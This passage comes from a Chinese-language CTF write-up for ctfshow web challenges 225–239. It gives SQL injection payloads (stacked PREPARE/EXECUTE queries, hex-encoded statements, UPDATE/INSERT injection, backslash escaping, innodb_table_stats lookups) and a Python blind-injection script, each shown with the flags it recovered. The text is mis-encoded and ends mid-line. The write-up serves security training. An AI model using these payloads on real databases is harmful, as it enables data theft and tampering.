è¯­å¥</span></span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²é¢„å¤„ç†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt1 FROM <span class="string">&#x27;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#x27;</span>;</span><br><span class="line">ET @a = <span class="number">3</span>;</span><br><span class="line">SET @b = <span class="number">4</span>;                                                   </span><br><span class="line">EXECUTE stmt1 USING @a, @b;</span><br></pre></td></tr></table></figure><p>å˜é‡å®šä¹‰é¢„å¤„ç†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SET @s = <span class="string">&#x27;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#x27;</span>;</span><br><span class="line">PREPARE stmt2 FROM @s;</span><br><span class="line">SET @c = <span class="number">6</span>;</span><br><span class="line">ET @d = <span class="number">8</span>;</span><br><span class="line">EXECUTE stmt2 USING @c, @d;</span><br><span class="line">DEALLOCATE PREPARE stmt2;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨concatç»•è¿‡è¿‡æ»¤ï¼Œç„¶åå°†åé¢çš„database()æ›¿æ¢ä¸ºéœ€è¦æ‰§è¡Œçš„è¯­å¥ã€‚åˆ«å¿˜è®°ä¸­é—´çš„ç©ºæ ¼ã€‚<br>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=ctfshow<span class="string">&#x27;;PREPARE aaa from concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect<span class="string">&#x27;, &#x27;</span> flagas <span class="keyword">from</span> ctfshow_flagasa<span class="string">&#x27;);EXECUTE aaa;</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…ç”¨concatå¾—åˆ°çš„è¿æ¥å­—ç¬¦ä¹Ÿå¯ä»¥ä»£æ›¿selectï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=ctfshow<span class="string">&#x27;;PREPARE aaa from concat(char(115,101,108,101,99,116), &#x27;</span> flagas <span class="keyword">from</span> ctfshow_flagasa<span class="string">&#x27;);EXECUTE aaa;</span></span><br></pre></td></tr></table></figure><h1 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h1><p>æˆ‘ä»¬ä¹‹å‰åœ¨web224ä¸­çš„æ–‡ä»¶ä¸Šä¼ å°±ä½¿ç”¨äº†è½¬æ¢ä¸ºåå…­è¿›åˆ¶ç„¶åå°†å†…å®¹å‰åŠ ä¸Š0xã€‚å†åŠ ä¸Šé¢„å¤„ç†ã€‚<br>åå…­è¿›åˆ¶è½¬æ¢å¯ä»¥è¿™æ ·å†™ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line">hex_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch in text:</span><br><span class="line">    hex_ch = <span class="title function_ invoke__">hex</span>(<span class="title function_ invoke__">ord</span>(ch)).<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    hex_str += hex_ch</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;åŸæ–‡ï¼š\n&quot;</span>+text)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;åå…­è¿›åˆ¶ï¼ˆä¸å¸¦0xï¼‰ï¼š\n&quot;</span>+hex_str)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;åå…­è¿›åˆ¶ï¼ˆå¸¦0xï¼‰ï¼š\n&quot;</span>+<span class="string">&quot;0x&quot;</span>+hex_str)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†éœ€è¦é¢„ç¼–è¯‘çš„è¯­å¥è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚ç„¶åå†ä¼ å…¥æ¯”å¦‚ï¼š<br>showè¢«è¿‡æ»¤æ‰äº†ï¼Œä¸è¦å‡ºç°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">åå…­è¿›åˆ¶å‰ï¼š</span><br><span class="line">select <span class="title function_ invoke__">database</span>()</span><br><span class="line">è½¬æ¢åï¼š</span><br><span class="line"><span class="number">0x73656c6563742064617461626173652829</span></span><br><span class="line">åŠ ä¸Šé¢„ç¼–è¯‘è¯­å¥ï¼š</span><br><span class="line">ctf<span class="string">&#x27;;PREPARE aaa from 0x73656c6563742064617461626173652829;EXECUTE aaa;--+</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†å°†ä¸­é—´çš„å†…å®¹è½¬æ¢ä¸ºéœ€è¦çš„æŸ¥è¯¢è¯­å¥å³å¯ã€‚<br>æ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>()</span><br><span class="line">?username=ctf<span class="string">&#x27;;PREPARE aaa from 0x73656c656374207461626c655f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE aaa;--+</span></span><br></pre></td></tr></table></figure><p>æŸ¥åˆ—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select column_name <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;ctfsh_ow_flagas&#x27;</span></span><br><span class="line">?username=ctf<span class="string">&#x27;;PREPARE aaa from 0x73656c65637420636f6c756d6e5f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE aaa;--+</span></span><br></pre></td></tr></table></figure><p>æŸ¥å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select flagasb <span class="keyword">from</span> ctfsh_ow_flagas</span><br><span class="line">?username=ctf<span class="string">&#x27;;PREPARE aaa from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE aaa;--+</span></span><br></pre></td></tr></table></figure><p>å°±èƒ½æŸ¥åˆ°flagäº†ã€‚</p><h1 id="web227ã€web228-web230"><a href="#web227ã€web228-web230" class="headerlink" title="web227ã€web228-web230"></a>web227ã€web228-web230</h1><blockquote><p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">https://blog.csdn.net/qq_41573234/article/details/80411079</a></p></blockquote><p>ä»–è¿™é‡Œå®šä¹‰äº†è‡ªå®šä¹‰å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦å»æŸ¥è¯¢ï¼š<code>information_schema.Routines</code>è¿™ä¸ªï¼š<br>å…¶ä¸­çš„getFlagå‡½æ•°ä¼šè°ƒç”¨flag ã€‚ä¹Ÿå°±æ˜¯è¯´ç›´æ¥<code>1&#39;;call getflag()</code>ä¹Ÿå¯ä»¥<br>ä½†å…¶å®è¿™é‡Œå·²ç»æ˜¾ç¤ºå‡ºäº†flagï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690450427521-41d6da19-84df-4400-932d-8186fd04e438.png" alt="image.png"></p><h1 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h1><h3 id="updateç›²æ³¨"><a href="#updateç›²æ³¨" class="headerlink" title="updateç›²æ³¨"></a>updateç›²æ³¨</h3><p>è¿™é‡Œéœ€è¦å¼€å‡ºæ¥ä¸¤ä¸ªé¡µé¢ï¼Œä¸€ä¸ªè´Ÿè´£ä¿®æ”¹ï¼ˆ<code>/api/</code>ï¼‰ï¼Œä¸€ä¸ªè´Ÿè´£æŸ¥çœ‹ï¼ˆ<code>/update.php</code>ï¼‰ã€‚ç›´æ¥ä¿®æ”¹å†…å®¹ï¼Œ<br>æ¯”å¦‚åœ¨ä¿®æ”¹é¡µé¢ä¸­ä¼ å‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;,username=database() where 1=1#&amp;username=1</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690461441854-8098f695-7156-4f77-a11f-4b87bc4fd815.png" alt="image.png"><br>è¿è¡Œä¹‹åè¿”å›æŸ¥çœ‹é¡µé¢å‘ç°è¢«æ›´æ–°äº†ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690461474262-de625929-36e1-4802-b43b-a5f9fffc57d3.png" alt="image.png"><br>ç„¶åå°±ä¾æ¬¡æ’å…¥æŸ¥è¯¢è¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flaga</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flaga<span class="string">&#x27;) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">id,flagas,info</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;,username=(select flagas from flaga) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">ctfshow&#123;bda6ff95-49e5-4832-98ef-5f2156f74200&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h1><p>è¿™ä¸ªé‡ä¸Šä¸€ä¸ªçš„å·®åˆ«å°±æ˜¯å¤šä¸ªmd5çš„æ‹¬å·éœ€è¦é—­åˆã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flagaa</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flagaa<span class="string">&#x27;) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">id,flagass,info</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;),username=(select flagass from flagaa) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">ctfshow&#123;d980485f-5f60-4558-a646-0c538bc3b9a1&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h1><p>ç›²æ³¨pythonã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//æ— è¿‡æ»¤</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬èƒ½æ³¨æ„åˆ°å½“è¾“å…¥å¯†ç çš„å€¼ä¸ºç¬¬ä¸€æ¬¡å‡ºç°æ—¶ä¸”æ­£ç¡®æ—¶ï¼Œåé¢çš„ç»“æœä¼šå‡ºç°<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690464682345-2a7b7d80-3e4d-4124-aefd-9a98db2a726d.png" alt="image.png"><br>ä½†æ˜¯å¦‚æœåé¢ä¸º0æˆ–è€…å‡ºç°è¿‡ä¸€æ¬¡åˆ™å‡ºç°<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690464738476-4e900a40-1db3-4449-b894-43c55ffd9137.png" alt="image.png">ã€<br>ç¼–å†™è„šæœ¬å³å¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLå¸ƒå°”ç›²æ³¨.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/27 21:10   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = r<span class="string">&#x27;http://9a69458e-791c-4ebd-abe9-45cc89eaf042.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;ctfshow&#x27;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;ctfshow&#x27;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag233333&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow&#x27;and+if(mid((select flagass233 from flag233333),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j in str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="title function_ invoke__">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="title function_ invoke__">str</span>(random.<span class="title function_ invoke__">random</span>())</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.<span class="title function_ invoke__">post</span>(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> r<span class="string">&#x27;æˆåŠŸ&#x27;</span> in r.<span class="title function_ invoke__">json</span>()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h1><p>å•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œç”¨äº†ä¸€ä¸ª<code>\</code>æ¥é€ƒé€¸ã€‚<br>å°±æ¯”å¦‚åŸè¯­å¥æ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>æ’å…¥ä¹‹åçš„è¯­å¥æ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;username&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç„¶åpasså¼ çš„å†…å®¹å°±æ˜¯<code>&#39; where username =</code><br>å¯èƒ½è¿™ä¹ˆè®²ä¼šå¬ä¸å¤ªæ‡‚ï¼Œå°±æ˜¯å°†&#39;å½“ä½œè½¬ä¹‰çš„â€™ ç„¶åå’Œåé¢çš„å•å¼•å·é—­åˆï¼š<br><code>update ctfshow_user set pass = &#39;\&#39; where username = &#39;username&#39;;</code><br>ä¹Ÿå°±å˜ä¸ºäº†ï¼š<br><code>update ctfshow_user set pass = &#39;&#39; where username = &#39;username&#39;</code><br>æµ‹è¯•payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.columns where table_schema=<span class="title function_ invoke__">database</span>())--+</span><br><span class="line">  banlist,ctfshow_user,ctfshow_user,flag23a</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿‡æ»¤æ‰äº†å•å¼•å·ï¼Œä½†æ˜¯ä¸é—­åˆå°±æŸ¥è¯¢ä¸åˆ°ï¼Œé‚£å°±ç”¨åå…­è¿›åˆ¶æ¥ä»£æ›¿ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select <span class="title function_ invoke__">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="number">0x666c6167323361</span>)--+</span><br><span class="line">  id,flagass23s3,info</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select flagass23s3 <span class="keyword">from</span> flag23a)--+</span><br><span class="line">  ctfshow&#123;a4682f2f-<span class="number">3</span>c53-<span class="number">464</span>d-<span class="number">8733</span>-<span class="number">7</span>d88487cb1f5&#125;</span><br></pre></td></tr></table></figure><h1 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h1><blockquote><p><a href="https://www.jb51.net/article/134678.htm">https://www.jb51.net/article/134678.htm</a> mysqlç»Ÿè®¡ä¿¡æ¯<br><a href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a> æ— åˆ—åæ³¨å…¥</p></blockquote><h3 id="è¿‡æ»¤äº†or-â€˜-informationè¡¨çš„æ›¿ä»£æ–¹æ³•"><a href="#è¿‡æ»¤äº†or-â€˜-informationè¡¨çš„æ›¿ä»£æ–¹æ³•" class="headerlink" title="è¿‡æ»¤äº†or  â€˜ informationè¡¨çš„æ›¿ä»£æ–¹æ³•"></a>è¿‡æ»¤äº†or  â€˜ informationè¡¨çš„æ›¿ä»£æ–¹æ³•</h3><p>è¿™é‡Œä¸åªæ˜¯orå…³é”®å­—ä¸èƒ½ç”¨ï¼Œè¿å¸¦ç€informationä¹Ÿä¸èƒ½ç”¨äº†ï¼Œå› æ­¤ä¹Ÿå°±éœ€è¦ç”¨ä½ åˆ«çš„æŸ¥è¯¢æ–¹æ³•äº†ã€‚<br><code>mysql.innodb_table_stats</code><br>æ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> mysql.innodb_table_stats where database_name=<span class="title function_ invoke__">database</span>())--+</span><br><span class="line">  banlist,ctfshow_user,flag23a1</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select b <span class="keyword">from</span> (select <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> union select * <span class="keyword">from</span> flag23a1 limit <span class="number">1</span>,<span class="number">1</span>)a</span><br><span class="line">  ctfshow&#123;<span class="number">9970</span>dea2-cadb-<span class="number">42</span>d7-<span class="number">8</span>c3b-a54b2ea469d1&#125;</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=,username=(select `<span class="number">2</span>` <span class="keyword">from</span>(select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> union select * <span class="keyword">from</span> flag23a1 limit <span class="number">1</span>,<span class="number">1</span>)a)-- - &amp;password=\</span><br><span class="line">ctfshow&#123;<span class="number">9970</span>dea2-cadb-<span class="number">42</span>d7-<span class="number">8</span>c3b-a54b2ea469d1&#125;</span><br></pre></td></tr></table></figure><p>æ— åˆ—åè¿™ç§ç‰¹æ®Šæ³¨å…¥éƒ½å¯ä»¥ã€‚</p><h1 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h1><p>è¿˜è¿‡æ»¤æ‰äº†flagè¿™æ¬¡ ä½†æ²¡å•¥ç”¨ ç»•è¿‡flagçš„ç­–ç•¥æœ‰å¾ˆå¤šã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> mysql.innodb_table_stats where database_name=<span class="title function_ invoke__">database</span>())--+</span><br><span class="line">banlist,ctfshow_user,flaga</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> to_base64(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flaga limit <span class="number">1</span>,<span class="number">1</span>)a)<span class="comment">--+</span></span><br><span class="line">Y3Rmc2hvd3tkOTQyOTcxNC00MTA2LTRkMjItYjg0YS01ODFiOTIzOWI2MGJ9</span><br><span class="line">ctfshow&#123;d9429714<span class="number">-4106</span><span class="number">-4</span>d22<span class="operator">-</span>b84a<span class="number">-581</span>b9239b60b&#125;</span><br></pre></td></tr></table></figure><h1 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h1><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>è®°å¾—æŠ“åŒ…ï¼Œä¸æ˜¯åŸæ¥çš„é‚£ä¸ªapiæ¥å£äº†ï¼Œè€Œæ˜¯ï¼š<code>/api/insert.php</code><br>å…¶ä½™çš„éƒ½ç›¸åŒã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">7</span><span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));--+&amp;password=2</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flag</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">7</span><span class="string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;));--+&amp;password=2</span></span><br><span class="line"><span class="string">id,flagass23s3,info</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">6</span><span class="string">&#x27;,(select flagass23s3 from flag));--+&amp;password=2</span></span><br><span class="line"><span class="string">ctfshow&#123;5efc59c3-4a93-4d07-a546-5a702b6c57c1&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h1><h3 id="insert-è¿‡æ»¤ç©ºæ ¼"><a href="#insert-è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="insert è¿‡æ»¤ç©ºæ ¼"></a>insert è¿‡æ»¤ç©ºæ ¼</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">3</span><span class="string">&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&amp;password=1</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flagb</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">3</span><span class="string">&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;</span>flagb<span class="string">&#x27;)));#&amp;password=1</span></span><br><span class="line"><span class="string">id,flag,info</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">3</span><span class="string">&#x27;,(select(flag)from(flagb)));#&amp;password=1</span></span><br><span class="line"><span class="string">ctfshow&#123;be8f3e4a-b6a0-4747-80d3-91979ef33988&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h1><h3 id="è¿‡æ»¤ç©ºæ ¼-or"><a href="#è¿‡æ»¤ç©ºæ ¼-or" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼ or"></a>è¿‡æ»¤ç©ºæ ¼ or</h3><p>ç›¸åŒæ“ä½œï¼Œåªä¸è¿‡æ›´æ¢æŸ¥è¯¢çš„è¡¨ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">3</span><span class="string">&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())));#&amp;password=1</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flagbb</span></span><br></pre></td></tr></table></figure><p>è¿™ç©åº”æŠŠ*è¿‡æ»¤äº†ï¼Œåªèƒ½çŒœflagåï¼Œçœ‹äº†ä¸€ä¸‹ç½‘ä¸Šçš„åšæ³•åŸºæœ¬å¦‚æ­¤ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 